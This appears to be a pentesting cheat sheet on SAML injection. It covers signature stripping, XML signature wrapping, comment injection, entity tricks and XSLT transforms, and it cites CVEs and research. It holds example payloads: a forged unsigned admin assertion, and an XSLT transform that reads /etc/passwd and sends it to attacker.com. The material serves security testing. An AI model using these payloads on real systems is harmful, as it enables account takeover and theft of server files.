# saml injection

> saml (security assertion markup language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. while saml is widely used to facilitate single sign-on (sso) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [invalid signature](#invalid-signature)
    * [signature stripping](#signature-stripping)
    * [xml signature wrapping attacks](#xml-signature-wrapping-attacks)
    * [xml comment handling](#xml-comment-handling)
    * [xml external entity](#xml-external-entity)
    * [extensible stylesheet language transformation](#extensible-stylesheet-language-transformation)
* [references](#references)


## tools

- [compasssecurity/samlraider](https://github.com/samlraider/samlraider) - saml2 burp extension.
- [zap addon/saml support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - allows to detect, show, edit, and fuzz saml requests.


## methodology

a saml response should contain the `<samlp:response xmlns:samlp="urn:oasis:names:tc:saml:2.0:protocol"`.


### invalid signature

signatures which are not signed by a real ca are prone to cloning. ensure the signature is signed by a real ca. if the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.


### signature stripping

> [...]accepting unsigned saml assertions is accepting a username without checking the password - @ilektrojohn

the goal is to forge a well formed saml assertion without signing it. for some default configurations if the signature section is omitted from a saml response, then no signature verification is performed.

example of saml assertion where `nameid=admin` without signature.

```xml
<?xml version="1.0" encoding="utf-8"?>
<saml2p:response xmlns:saml2p="urn:oasis:names:tc:saml:2.0:protocol" destination="http://localhost:7001/saml2/sp/acs/post" id="id39453084082248801717742013" issueinstant="2018-04-22t10:28:53.593z" version="2.0">
    <saml2:issuer xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion" format="urn:oasis:names:tc:saml:2.0:nameidformat:entity">redacted</saml2:issuer>
    <saml2p:status xmlns:saml2p="urn:oasis:names:tc:saml:2.0:protocol">
        <saml2p:statuscode value="urn:oasis:names:tc:saml:2.0:status:success" />
    </saml2p:status>
    <saml2:assertion xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion" id="id3945308408248426654986295" issueinstant="2018-04-22t10:28:53.593z" version="2.0">
        <saml2:issuer format="urn:oasis:names:tc:saml:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion">redacted</saml2:issuer>
        <saml2:subject xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion">
            <saml2:nameid format="urn:oasis:names:tc:saml:1.1:nameidformat:unspecified">admin</saml2:nameid>
            <saml2:subjectconfirmation method="urn:oasis:names:tc:saml:2.0:cm:bearer">
                <saml2:subjectconfirmationdata notonorafter="2018-04-22t10:33:53.593z" recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:subjectconfirmation>
        </saml2:subject>
        <saml2:conditions notbefore="2018-04-22t10:23:53.593z" notonorafter="2018-0422t10:33:53.593z" xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion">
            <saml2:audiencerestriction>
                <saml2:audience>wls_sp</saml2:audience>
            </saml2:audiencerestriction>
        </saml2:conditions>
        <saml2:authnstatement authninstant="2018-04-22t10:28:49.876z" sessionindex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:saml:2.0:assertion">
            <saml2:authncontext>
                <saml2:authncontextclassref>urn:oasis:names:tc:saml:2.0:ac:classes:passwordprotectedtransport</saml2:authncontextclassref>
            </saml2:authncontext>
        </saml2:authnstatement>
    </saml2:assertion>
</saml2p:response>
```


### xml signature wrapping attacks

xml signature wrapping (xsw) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.

- **xsw1**: applies to saml response messages. add a cloned unsigned copy of the response after the existing signature.
- **xsw2**: applies to saml response messages. add a cloned unsigned copy of the response before the existing signature.
- **xsw3**: applies to saml assertion messages. add a cloned unsigned copy of the assertion before the existing assertion.
- **xsw4**: applies to saml assertion messages. add a cloned unsigned copy of the assertion within the existing assertion.
- **xsw5**: applies to saml assertion messages. change a value in the signed copy of the assertion and adds a copy of the original assertion with the signature removed at the end of the saml message.
- **xsw6**: applies to saml assertion messages. change a value in the signed copy of the assertion and adds a copy of the original assertion with the signature removed after the original signature.
- **xsw7**: applies to saml assertion messages. add an “extensions” block with a cloned unsigned assertion.
- **xsw8**: applies to saml assertion messages. add an “object” block containing a copy of the original assertion with the signature removed.


in the following example, these terms are used.

- **fa**: forged assertion
- **la**: legitimate assertion
- **las**: signature of the legitimate assertion

```xml
<samlresponse>
  <fa id="evil">
      <subject>attacker</subject>
  </fa>
  <la id="legitimate">
      <subject>legitimate user</subject>
      <las>
         <reference reference uri="legitimate">
         </reference>
      </las>
  </la>
</samlresponse>
```

in the github enterprise vulnerability, this request would verify and create a sessions for `attacker` instead of `legitimate user`, even if `fa` is not signed.


### xml comment handling

a threat actor who already has authenticated access into a sso system can authenticate as another user without that individual’s sso password. this [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/vulnerabilities/saml-flaw.png) has multiple cve in the following libraries and products.

- onelogin - python-saml - cve-2017-11427
- onelogin - ruby-saml - cve-2017-11428
- clever - saml2-js - cve-2017-11429
- omniauth-saml - cve-2017-11430
- shibboleth - cve-2018-0489
- duo network gateway - cve-2018-7340

researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.

```xml
<samlresponse>
    <issuer>https://idp.com/</issuer>
    <assertion id="_id1234">
        <subject>
            <nameid>user@user.com<!--xmlcomment-->.evil.com</nameid>
```
where `user@user.com` is the first part of the username, and `.evil.com` is the second.


### xml external entity

an alternative exploitation would use `xml entities` to bypass the signature verification, since the content will not change, except during xml parsing.

in the following example:
- `&s;` will resolve to the string `"s"`
- `&f1;` will resolve to the string `"f1"`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!doctype response [
  <!entity s "s">
  <!entity f1 "f1">
]>
<saml2p:response xmlns:saml2p="urn:oasis:names:tc:saml:2.0:protocol"
  destination="https://idptestbed/shibboleth.sso/saml2/post"
  id="_04cfe67e596b7449d05755049ba9ec28"
  inresponseto="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  issueinstant="2017-12-08t15:15:56.062z" version="2.0">
[...]
  <saml2:attribute friendlyname="uid"
    name="urn:oid:0.9.2342.19200300.100.1.1"
    nameformat="urn:oasis:names:tc:saml:2.0:attrname-format:uri">
    <saml2:attributevalue>
      &s;taf&f1;
    </saml2:attributevalue>
  </saml2:attribute>
[...]
</saml2p:response>
```

the saml response is accepted by the service provider. due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.


### extensible stylesheet language transformation

an xslt can be carried out by using the `transform` element.


[image extracted text: [image not found]]
    
picture from [http://sso-attacks.org/xslt_attack](http://sso-attacks.org/xslt_attack)    

```xml
<ds:signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:transforms>
      <ds:transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/xsl/transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerurl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploiturl"select="concat($attackerurl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploiturl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:transform>
    </ds:transforms>
  ...
</ds:signature>
```


## references

- [attacking sso: common saml vulnerabilities and ways to find them - jem jensen - march 7, 2017](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
- [how to hunt bugs in saml; a methodology - part i - ben risher (@epi052) - march 7, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [how to hunt bugs in saml; a methodology - part ii - ben risher (@epi052) - march 13, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [how to hunt bugs in saml; a methodology - part iii - ben risher (@epi052) - march 16, 2019](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [on breaking saml: be whoever you want to be - juraj somorovsky, andreas mayer, jorg schwenk, marco kampmann, and meiko jensen - august 23, 2012](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
- [oracle weblogic - multiple saml vulnerabilities (cve-2018-2998/cve-2018-2933) - denis andzakovic - july 18, 2018](https://pulsesecurity.co.nz/advisories/weblogic-saml-vulnerabilities)
- [saml burp extension - roland bischofberger - july 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
- [saml security cheat sheet - owasp - february 2, 2019](https://github.com/owasp/cheatsheetseries/blob/master/cheatsheets/saml_security_cheat_sheet.md)
- [the road to your codebase is paved with forged assertions - ioannis kakavas (@ilektrojohn) - march 13, 2017](http://www.economyofmechanism.com/github-saml)
- [truncation of saml attributes in shibboleth 2 - redteam-pentesting.de - january 15, 2018](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
- [vulnerability note vu#475445 - garret wassermann - february 27, 2018](https://www.kb.cert.org/vuls/id/475445/)